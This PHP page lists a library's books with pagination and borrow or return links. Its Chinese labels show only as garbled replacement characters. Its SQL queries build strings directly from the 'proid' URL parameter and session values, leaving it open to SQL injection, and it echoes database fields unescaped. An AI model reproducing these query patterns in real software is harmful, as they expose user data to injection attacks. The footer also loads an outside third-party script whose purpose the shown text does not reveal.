<?php
include("config.php");
//���δ���
error_reporting(E_ALL & ~E_NOTICE);
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>�������</title>
<link rel="stylesheet" href="style.css" type="text/css">
</head>
<body>
<?php include("head.php");?>
		<table width="999" border="0" align="center" cellpadding="0" cellspacing="0">
                <tr>
                  <td height="22">
	<?php
	$pagesize=10;
	if(!urldecode($_GET[proid])){
	$sql="select * from bookinfo order by ID desc";
	}else{
	$sql="select * from bookinfo where type='".urldecode($_GET[proid])."'";
	}
	$rs=mysql_query($sql);
	$recordcount=mysql_num_rows($rs);
	$pagecount=($recordcount-1)/$pagesize+1;
	$pagecount=(int)$pagecount;
	$pageno=$_GET["pageno"];
	if($pageno=="")
	{
		$pageno=1;
	}
	if($pageno<1)
	{
		$pageno=1;
	}
	if($pageno>$pagecount)
	{
		$pageno=$pagecount;
	}
	$startno=($pageno-1)*$pagesize;
	if(!urldecode($_GET[proid])){
	$sql="select * from bookinfo order by ID desc limit $startno,$pagesize";
	}else{
	$sql="select * from bookinfo where type='".urldecode($_GET[proid])."' order by ID desc limit $startno,$pagesize";
	}
	$rs=mysql_query($sql);
?>
  <table width="999" border="0" align="center" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC">
      <tr>
        <td width="6%" height="35" align="center" bgcolor="#FFFFFF">ID</td>
        <td width="21%" align="center" bgcolor="#FFFFFF">����</td>
        <td width="15%" align="center" bgcolor="#FFFFFF">����</td>
        <td width="10%" align="center" bgcolor="#FFFFFF">ISBN</td>
        <td width="12%" align="center" bgcolor="#FFFFFF">������</td>
        <td width="12%" align="center" bgcolor="#FFFFFF">����</td>
        <td width="9%" align="center" bgcolor="#FFFFFF">����ʱ��</td>
        <td width="3%" align="center" bgcolor="#FFFFFF">�۸�</td>
        <td width="3%" align="center" bgcolor="#FFFFFF">����</td>
        <td width="9%" align="center" bgcolor="#FFFFFF">����</td>
      </tr>
    <?php
	while($rows=mysql_fetch_assoc($rs))
	{
	?>
	    <tr align="center" bgcolor="#FFFFFF">
	    <td width="6%"><?php echo $rows["ID"]?></td>
	    <td class="td_bg" width="21%" height="26"><?php echo $rows["bookname"]?></td>
	    <td class="td_bg" width="15%" height="26"><?php echo $rows["author"]?></td>
	    <td class="td_bg" width="10%" height="26"><?php echo $rows["ISBN"]?></td>
	    <td width="12%" height="26" class="td_bg"><?php echo $rows["publisher"]?></td>
	    <td width="12%" height="26" class="td_bg"><?php echo $rows["type"]?></td>
	    <td width="9%" height="26" class="td_bg"><?php echo $rows["publishtime"]?></td>
	    <td width="3%" height="26" class="td_bg"><?php echo $rows["price"]?></td>
	    <td width="3%" height="26" class="td_bg"><?php echo $rows["num"]?></td>
	    <!--<td class="td_bg" width="20%">  -->
	  <td align="center" bgcolor="#FFFFFF" class="line2">
	  <?php 
	  $rs2=mysql_query("select * from lend where book_id='".$rows['id']."' and user_id='".$_SESSION['id']."'");
	  $rows2=mysql_fetch_assoc($rs2);
	  if($rows2['book_id']){
	  echo "<font color='red'>���ѽ���</font>&nbsp;&nbsp;<a href=huanshu.php?book_id=$rows[id]>��Ҫ����</a>";
	  }else{
	  	if($rows["leave_number"]==0){
		echo "<font color='#cccc00'>�����ѽ���</font>";
		}else{
	  echo "<a href=jieshu.php?book_id=$rows[id]>��Ҫ����</a>";
	  }
	  	}
	  ?>	  </td>
	</tr>
	<?php
	}
?>
</table>
<table width="100%" border="0" align="center" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
  <tr>
  <td height="35" align="center" bgcolor="#FFFFFF">
  <?php
	if($pageno==1)
	{
	?>
    ��ҳ | ��һҳ | <a href="?pageno=<?php echo $pageno+1?>">��һҳ</a> | <a href="?pageno=<?php echo $pagecount?>">ĩҳ</a>
    <?php
	}
	else if($pageno==$pagecount)
	{
	?>
    <a href="?pageno=1">��ҳ</a> | <a href="?pageno=<?php echo $pageno-1?>">��һҳ</a> | ��һҳ | ĩҳ
    <?php
	}
	else
	{
	?>
    <a href="?pageno=1">��ҳ</a> | <a href="?pageno=<?php echo $pageno-1?>">��һҳ</a> | <a href="?pageno=<?php echo $pageno+1?>" class="forumRowHighlight">��һҳ</a> | <a href="?pageno=<?php echo $pagecount?>">ĩҳ</a>
    <?php
	}
?>
    &nbsp;ҳ�Σ�<?php echo $pageno ?>/<?php echo $pagecount ?>ҳ&nbsp;����<?php echo $recordcount?>����Ϣ</td>
  </tr>
</table></td></tr>
</table>
        <table width="782" height="30" border="0" align="center" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
          <tr>
            <td height="19" align="center" background="button1_bg.jpg">&nbsp;Copyright @ 2013-2015 ������ַ.com ALL Rights Reserved
      <!--��Դ����ѿ�Դ��������Ȩ��Ϣ�㽫��ñ�վ��Ѽ���֧�ֺͳ�����������-->
      <script type="text/javascript" src="http://www.04ie.com/net/cpt.js"></script></td>
          </tr>
        </table>
</body>
</html>
